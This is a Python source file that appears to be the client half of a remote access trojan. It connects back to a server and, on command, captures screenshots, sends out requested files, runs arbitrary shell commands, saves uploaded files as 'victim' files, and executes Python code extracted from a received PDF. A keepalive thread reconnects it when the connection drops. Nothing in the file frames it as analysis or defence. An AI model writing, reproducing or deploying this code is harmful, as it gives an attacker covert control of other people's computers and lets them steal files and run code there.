import time
import socket
import threading
import pyautogui
import os
import subprocess
import PyPDF2
import io
SERVER_IP = socket.gethostname()
DATA_PORT = 8000  # Port for data exchange
STATUS_PORT = 9000  # Port for connection monitoring



def send_data(data_socket):
    try:
        while True:
        
            print('new epoch')
            data_socket.settimeout(1200000.0)
            num = data_socket.recv(1024).decode()
            num = int(num)
            
            if num ==1 :
                num2 = int(data_socket.recv(1024).decode())
                if num2 == 1:
                    # Get the current mouse position
                    current_x, current_y = pyautogui.position()
                    print("Current mouse position:", current_x, current_y)

                    # Move the mouse to a new position
                    screen_width, screen_height = pyautogui.size()
                    print("Screen resolution:", screen_width, "x", screen_height)
                    en = str(screen_width).encode()
                    data_socket.send(en)
                    en2 = str(screen_height).encode()
                    data_socket.send(en2)
                    new_x = data_socket.recv(1024).decode()
                    new_x = int(new_x)
                    print('x taked')
                    new_y = data_socket.recv(1024).decode()
                    new_y = int(new_y)
                    print('y taked')
                    print(new_x,new_y)
                    ack= 'ok'
                    data_socket.send(ack.encode())
                    pyautogui.moveTo(new_x, new_y, duration=1.0)  # Duration is optional, it specifies the time taken to move the mouse
                    bye = data_socket.recv(1024).decode()
                    print(bye)
                    # Get the updated mouse position
                    updated_x, updated_y = pyautogui.position()
                    print("Updated mouse position:", updated_x, updated_y)
                if num2 == 2 :
                    pyautogui.click()
                    print('clicked')
                    data_socket.send(('Mouse clicked successfully').encode())
                if num2 == 3:
                    current_x, current_y = pyautogui.position()
                    print("Current mouse position:", current_x, current_y)
                    num3 = int(data_socket.recv(1024).decode())
                    n = int(data_socket.recv(1024).decode())
                    if num3 == 1:
        
                        # Scroll up by n pixels
                        pyautogui.scroll(n)
                        updated_x, updated_y = pyautogui.position()
                        print("Updated mouse position:", updated_x, updated_y)
                        data_socket.send(('Mouse Scrolled successfully').encode())
                    elif num3==2:
                        # Scroll down by n pixels
                        pyautogui.scroll(-1*(n))
                        updated_x, updated_y = pyautogui.position()
                        print("Updated mouse position:", updated_x, updated_y)
                        data_socket.send(('Mouse Scrolled successfully').encode())
                    else: 
                        data_socket.send(('coudnt scroll!').encode())
                    
                    
            if num == 2 :
                # Capture the entire screen
                screenshot = pyautogui.screenshot()
                screenshot.save('screenshot.png')
                myfile = open('screenshot.png', 'rb')
                bytes = myfile.read()
                print('screenshot taken succesfully')
                data_socket.sendall(bytes)
            if num == 3 :
                file_name = data_socket.recv(1024).decode()
                
                print('file name recieved!')
                print("file name : " , file_name)
                if os.path.exists(file_name):
                        print("File exists.")
                        try:
                            with open(file_name, 'rb') as file:
                                data_socket.send(("yes").encode())
                                bytes = file.read()
                                data_socket.sendall(bytes)
                                print("File sent successfully!")
                                msg = data_socket.recv(1024)
                                print('wait for 2 minutes')
                        except IOError:
                            print("File not found or could not be opened.")
                            data_socket.send(("no").encode())
                        except TimeoutError :
                            print('''data didn't recieved ''')
                else:
                    print("File does not exist.")  
                    data_socket.send(("no").encode())
            if num == 4:
                while True:
                    command = data_socket.recv(1024).decode()
                    print('command recieved!')
                    print(command)
                    if command == 'exit':
                        break
                    else:
                        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        output= proc.stdout.read()+proc.stderr.read()
                        data_socket.send(output)
                        print(output)
            if num == 5 :
                try:
                    file_name = data_socket.recv(1024).decode()
                    print('file name recieved!')
                    file_ext = file_name.split('.')[1]
                    data = data_socket.recv(40960000)
                    print('data recieved')
                    # Save the received data as a file
                    if data:
                        second_path = r"C:\Users\pzedb\my_projects\victim." + file_ext
                        with open(second_path, 'wb') as file:
                            file.write(data)
                        file.close()
                        print("File received successfully!")
                        
                        data_socket.send(('recieved').encode())
                        print('all done!')
                        
                except:
                    print('error ')
                    continue
            if num == 6 :
                pdf_data = b''
                data_socket.send(('im ready!').encode())
                while True:
                    chunk = data_socket.recv(1024)
                    if chunk.decode('latin-1') == "f":

                        break
                    pdf_data += chunk
                    print('recieving..')
                # Load the received PDF data
                print('got all!')
                pdf_file = io.BytesIO(pdf_data)

                # Read the code from the PDF file
                pdf_reader = PyPDF2.PdfReader(pdf_file)
                code = ''
                for page in pdf_reader.pages:
                    code += page.extract_text()
                
                
                try:
                    print('executing..')
                    exec(code)
                except Exception as e:
                    print('An error occurred while executing the code:')
                    print(e)
            if num == 7:
                print('\n data socket closed')
                return
                        
    except:
        #end thread
        print('\n data socket closed')


def send_status(status_socket):
    try:
        while True : 
            # Send status message to the server
            status_msg = "I'm still connected"
            status_socket.send(status_msg.encode())

            print('\nsend status')

            # Sleep for 2 minutes
            time.sleep(120000.0)
    except:
            print('status socket closed')
            print('end connection')
            print('trying again!')
            start_client()


def start_client():
    try:
        data_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        data_socket.connect((SERVER_IP, DATA_PORT))
        userid = data_socket.recv(1024)
        print('userid: ' ,userid.decode())
        
        print('start data thread')
        #Start a thread for sending data
        data_thread = threading.Thread(target=send_data , args=(data_socket,))
        data_thread.start()

        status_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        status_socket.connect((SERVER_IP, STATUS_PORT))
        status_socket.send(userid)
        msg = status_socket.recv(1024)
        

        
        print('start status thread')
        #Start a thread for sending status messages
        status_thread = threading.Thread(target=send_status,args=(status_socket,))
        status_thread.start()
    except:
        print('server is off!')

start_client()
